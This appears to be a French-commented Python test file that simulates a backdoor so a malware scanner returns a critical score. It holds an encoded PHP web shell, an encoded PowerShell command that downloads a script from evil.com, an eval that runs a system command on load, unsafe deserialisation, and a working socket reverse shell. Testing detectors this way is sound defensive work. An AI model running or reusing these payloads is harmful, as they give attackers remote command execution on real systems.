# ==========================================
# TEST D'ANALYSE : RISQUE CRITIQUE
# Objectif : déclencher un score >= 80
# ==========================================
# Ce fichier simule un backdoor Python basique.
# Il contient plusieurs techniques d'obfuscation combinées.

import os
import subprocess
import socket
import marshal
import pickle

# ------------------------------------------
# DETECTION 1 : Mots-clés multiples (score élevé)
# ------------------------------------------
# os.system         → +50
# subprocess        → +40
# socket            → +40
# marshal           → +45
# pickle            → +45
# eval              → +50
# /bin/bash         → +45
# (total brut > 100, plafonné à 100 → CRITIQUE)

# ------------------------------------------
# DETECTION 2 : Base64 — commande cachée
# Décodé : eval($_POST['cmd']);
# ------------------------------------------
b64_payload = "ZXZhbCgkX1BPU1RbJ2NtZCddKTs="

# ------------------------------------------
# DETECTION 3 : Base64 PowerShell encodé
# Décodé : IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')
# ------------------------------------------
ps_encoded = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnaAB0AHQAcAA6AC8ALwBlAHYAaQBsAC4AYwBvAG0ALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA=="

# ------------------------------------------
# DETECTION 4 : Séquence hexadécimale
# Décodé : /bin/sh -i
# ------------------------------------------
shellcode_hex = "\x2f\x62\x69\x6e\x2f\x73\x68\x20\x2d\x69"

# ------------------------------------------
# DETECTION 5 : Exécution directe de commande
# ------------------------------------------
def run_shell(cmd):
    os.system(cmd)
    subprocess.Popen(["/bin/bash", "-c", cmd], shell=True)

# ------------------------------------------
# DETECTION 6 : Désérialisation dangereuse
# ------------------------------------------
def load_payload(raw_bytes):
    return pickle.loads(marshal.loads(raw_bytes))

# ------------------------------------------
# DETECTION 7 : eval dynamique
# ------------------------------------------
user_input = "__import__('os').system('id')"
eval(user_input)

# ------------------------------------------
# DETECTION 8 : Reverse shell via socket
# ------------------------------------------
def reverse_shell(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    while True:
        cmd = s.recv(1024).decode()
        output = subprocess.Popen(
            cmd, shell=True, stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        s.send(output.communicate()[0])
